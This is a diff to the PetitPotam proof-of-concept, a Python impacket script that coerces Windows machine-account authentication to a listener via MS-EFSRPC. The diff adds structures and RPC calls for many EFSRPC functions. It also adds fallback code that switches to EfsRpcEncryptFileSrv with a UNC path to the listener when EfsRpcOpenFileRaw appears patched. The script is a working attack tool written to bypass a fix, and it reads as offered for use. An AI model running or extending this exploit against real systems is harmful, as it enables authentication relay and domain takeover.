@@ -12,7 +12,7 @@ import argparse
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
-from impacket.dcerpc.v5.dtypes import ULONG, WSTR
+from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.uuid import uuidtup_to_bin
 
@@ -26,7 +26,7 @@ show_banner = '''
           _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
           "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                          
-PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                       by topotam (@topotam77)
       
                      Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
@@ -56,6 +56,72 @@ class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
     structure = (
         ('Data', '20s'),
     )
+class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
+    align = 1
+    structure = (
+        ('Data', '20s'),
+    )
+class EFS_EXIM_PIPE(NDRSTRUCT):
+    align = 1
+    structure = (
+        ('Data', ':'),
+    )
+class EFS_HASH_BLOB(NDRSTRUCT):
+    
+    structure = (
+        ('Data', DWORD),
+        ('cbData', PCHAR),
+    )
+class EFS_RPC_BLOB(NDRSTRUCT):
+    
+    structure = (
+        ('Data', DWORD),
+        ('cbData', PCHAR),
+    )
+    
+class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
+    structure = (
+        ('Type', DWORD),
+        ('Data', DWORD),
+        ('cbData', PCHAR),
+    )    
+class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
+    structure = (
+        ('Lenght', DWORD),
+        ('SID', RPC_SID),
+        ('Hash', EFS_HASH_BLOB),
+        ('Display', LPWSTR),
+    )   
+class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
+    structure = (
+        ('Lenght', DWORD),
+        ('SID', RPC_SID),
+        ('Hash', EFS_CERTIFICATE_BLOB),
+   
+    )   
+class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
+    align = 1
+    structure = (
+        ('Cert', DWORD),
+        ('Users', ENCRYPTION_CERTIFICATE_HASH),
+    )
+class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):    
+    structure = (
+        ('Type', DWORD),
+        ('HASH', ENCRYPTION_CERTIFICATE_HASH_LIST),
+        ('Certif', ENCRYPTION_CERTIFICATE),
+        ('Blob', EFS_RPC_BLOB),
+    )   
+class EFS_RPC_BLOB(NDRSTRUCT):
+    structure = (
+        ('Data', DWORD),
+        ('cbData', PCHAR),
+    )
+class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
+    align = 1
+    structure = (
+        ('Data', ':'),
+    )
 
 ################################################################################
 # RPC CALLS
@@ -72,12 +138,182 @@ class EfsRpcOpenFileRawResponse(NDRCALL):
         ('hContext', EXIMPORT_CONTEXT_HANDLE),
         ('ErrorCode', ULONG),
     )
+class EfsRpcEncryptFileSrv(NDRCALL):
+    opnum = 4
+    structure = (
+        ('FileName', WSTR),
+    )
+
+class EfsRpcEncryptFileSrvResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcDecryptFileSrv(NDRCALL):
+    opnum = 5
+    structure = (
+        ('FileName', WSTR),
+        ('Flag', ULONG),
+    )
+
+class EfsRpcDecryptFileSrvResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcQueryUsersOnFile(NDRCALL):
+    opnum = 6
+    structure = (
+        ('FileName', WSTR),
+        
+    )
+class EfsRpcQueryUsersOnFileResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcQueryRecoveryAgents(NDRCALL):
+    opnum = 7
+    structure = (
+        ('FileName', WSTR),
+        
+    )
+class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcRemoveUsersFromFile(NDRCALL):
+    opnum = 8
+    structure = (
+        ('FileName', WSTR),
+        ('Users', ENCRYPTION_CERTIFICATE_HASH_LIST)
+        
+    )
+class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcAddUsersToFile(NDRCALL):
+    opnum = 9
+    structure = (
+        ('FileName', WSTR),
+        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST)
+        
+    )
+class EfsRpcAddUsersToFileResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )    
+class EfsRpcFileKeyInfo(NDRCALL):
+    opnum = 12
+    structure = (
+        ('FileName', WSTR),
+        ('infoClass', DWORD),
+    )
+class EfsRpcFileKeyInfoResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
+    opnum = 13
+    structure = (
+        ('SrcFileName', WSTR),
+        ('DestFileName', WSTR),
+        ('dwCreationDisposition', DWORD),
+        ('dwAttributes', DWORD),
+        ('RelativeSD', EFS_RPC_BLOB),
+        ('bInheritHandle', BOOL),
+    ) 
+    
+class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcAddUsersToFileEx(NDRCALL):
+    opnum = 15
+    structure = (
+        ('dwFlags', DWORD),
+        ('Reserved', EFS_RPC_BLOB),
+        ('FileName', WSTR),
+        ('dwAttributes', DWORD),
+        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),
+    ) 
+    
+class EfsRpcAddUsersToFileExResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcFileKeyInfoEx(NDRCALL):
+    opnum = 16
+    structure = (
+        ('dwFileKeyInfoFlags', DWORD),
+        ('Reserved', EFS_RPC_BLOB),
+        ('FileName', WSTR),
+        ('InfoClass', DWORD),
+    )
+class EfsRpcFileKeyInfoExResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcGetEncryptedFileMetadata(NDRCALL):
+    opnum = 18
+    structure = (
+        ('FileName', WSTR),
+    )
+class EfsRpcGetEncryptedFileMetadataResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )   
+class EfsRpcSetEncryptedFileMetadata(NDRCALL):
+    opnum = 19
+    structure = (
+        ('FileName', WSTR),
+        ('OldEfsStreamBlob', EFS_RPC_BLOB),
+        ('NewEfsStreamBlob', EFS_RPC_BLOB),
+        ('NewEfsSignature', ENCRYPTED_FILE_METADATA_SIGNATURE),
+    )
+class EfsRpcSetEncryptedFileMetadataResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+class EfsRpcEncryptFileExSrv(NDRCALL):
+    opnum = 21
+    structure = (
+        ('FileName', WSTR),
+        ('ProtectorDescriptor', WSTR),
+        ('Flags', ULONG),
+    )
+class EfsRpcEncryptFileExSrvResponse(NDRCALL):
+    structure = (
+        ('ErrorCode', ULONG),
+    )
+#class EfsRpcQueryProtectors(NDRCALL):
+#    opnum = 21
+#    structure = (
+#        ('FileName', WSTR),
+#        ('ppProtectorList', PENCRYPTION_PROTECTOR_LIST),
+#    )
+#class EfsRpcQueryProtectorsResponse(NDRCALL):
+#    structure = (
+#        ('ErrorCode', ULONG),
+#    )
 
 ################################################################################
 # OPNUMs and their corresponding structures
 ################################################################################
 OPNUMS = {
- 0 : (EfsRpcOpenFileRaw, EfsRpcOpenFileRawResponse),
+    0   : (EfsRpcOpenFileRaw, EfsRpcOpenFileRawResponse),
+    4   : (EfsRpcEncryptFileSrv, EfsRpcEncryptFileSrvResponse),
+    5   : (EfsRpcDecryptFileSrv, EfsRpcDecryptFileSrvResponse),
+    6   : (EfsRpcQueryUsersOnFile, EfsRpcQueryUsersOnFileResponse),
+    7   : (EfsRpcQueryRecoveryAgents, EfsRpcQueryRecoveryAgentsResponse),
+    8   : (EfsRpcRemoveUsersFromFile, EfsRpcRemoveUsersFromFileResponse),
+    9   : (EfsRpcAddUsersToFile, EfsRpcAddUsersToFileResponse),
+    12   : (EfsRpcFileKeyInfo, EfsRpcFileKeyInfoResponse),
+    13   : (EfsRpcDuplicateEncryptionInfoFile, EfsRpcDuplicateEncryptionInfoFileResponse),
+    15   : (EfsRpcAddUsersToFileEx, EfsRpcAddUsersToFileExResponse),
+    16   : (EfsRpcFileKeyInfoEx, EfsRpcFileKeyInfoExResponse),
+    18   : (EfsRpcGetEncryptedFileMetadata, EfsRpcGetEncryptedFileMetadataResponse),
+    19   : (EfsRpcSetEncryptedFileMetadata, EfsRpcSetEncryptedFileMetadataResponse),
+    21   : (EfsRpcEncryptFileExSrv, EfsRpcEncryptFileExSrvResponse),
+#    22   : (EfsRpcQueryProtectors, EfsRpcQueryProtectorsResponse),
 }
  
 class CoerceAuth():
@@ -131,8 +367,7 @@ class CoerceAuth():
             sys.exit()
         print("[+] Successfully bound!")
         return dce
-
-
+        
     def EfsRpcOpenFileRaw(self, dce, listener):
         print("[-] Sending EfsRpcOpenFileRaw!")
         try:
@@ -146,10 +381,28 @@ class CoerceAuth():
             if str(e).find('ERROR_BAD_NETPATH') >= 0:
                 print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                 print('[+] Attack worked!')
-                pass
+                sys.exit()
+            if str(e).find('rpc_s_access_denied') >= 0:
+                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
+                print('[+] OK! Using unpatched function!')
+                print("[-] Sending EfsRpcEncryptFileSrv!")
+                try:
+                    request = EfsRpcEncryptFileSrv()
+                    request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
+                    resp = dce.request(request)
+                except Exception as e:
+                    if str(e).find('ERROR_BAD_NETPATH') >= 0:
+                        print('[+] Got expected ERROR_BAD_NETPATH exception!!')
+                        print('[+] Attack worked!')
+                        pass
+                    else:
+                        print("Something went wrong, check error status => %s" % str(e)) 
+                        sys.exit()
+                
             else:
                 print("Something went wrong, check error status => %s" % str(e)) 
                 sys.exit()
+
 def main():
     parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
     parser.add_argument('-u', '--username', action="store", default='', help='valid username')
